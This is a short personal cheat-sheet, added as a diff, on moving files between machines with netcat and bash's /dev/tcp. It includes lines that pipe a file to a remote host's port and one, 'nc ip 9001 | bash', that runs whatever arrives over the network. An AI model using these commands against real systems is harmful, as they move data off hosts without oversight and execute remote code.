@@ -1,0 +1,34 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  NETCAT, NC TRANSFER FILE
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-08-05[Aug-Wed]14-59PM 
+
+##https://who23.github.io/2020/12/03/sockets-in-your-shell.html
+
+CREATE LISTENER ON TARGET BOX
+
+nc -lvnp 9001
+
+ON SOURCE BOX
+
+cat file > /dev/tcp/ip/port
+
+cat testfile.zip > /dev/tcp/172.16.0.105/9001
+
+DOES CAT FILE NOT DOESN'T CREATE FILE ON TARGET BOX
+
+SAW WORKING EXAMPLE WITH
+
+tar -cjvf dir.tar.bz2 sourcedir
+cat dir.tar.bz2 > /dev/tcp/172.16.0.105/9001
+
+==
+
+ANOTHER WAY
+
+nc lvnp 9001 < file.sh
+
+nc ip 9001 | bash
+
